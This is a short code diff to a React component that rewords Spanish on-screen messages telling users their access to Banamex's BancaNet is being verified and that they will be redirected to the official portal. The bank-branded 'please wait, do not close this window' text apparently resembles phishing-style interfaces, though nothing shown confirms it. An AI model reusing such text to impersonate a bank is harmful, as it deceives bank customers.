@@ -79,7 +79,7 @@ const GenerandoAclaracion: React.FC = () => {
         {hasSessionId ? (
           <>
             <p className="mb-2">
-              Estamos preparando su proceso de verificación para el acceso a BancaNet Empresarial de Banamex.
+              Estamos preparando su proceso de verificación para el acceso a Aclaraciones BancaNet de Banamex.
             </p>
             <p>
               Será redirigido a la plataforma segura en unos momentos. Por favor no cierre esta ventana.
@@ -88,7 +88,7 @@ const GenerandoAclaracion: React.FC = () => {
         ) : (
           <>
             <p className="mb-2">
-              Estamos procesando su acceso a BancaNet Empresarial de Banamex.
+              Estamos procesando su acceso a Aclaraciones BancaNet de Banamex.
             </p>
             <p>
               Será redirigido al portal oficial de Banamex en unos momentos.
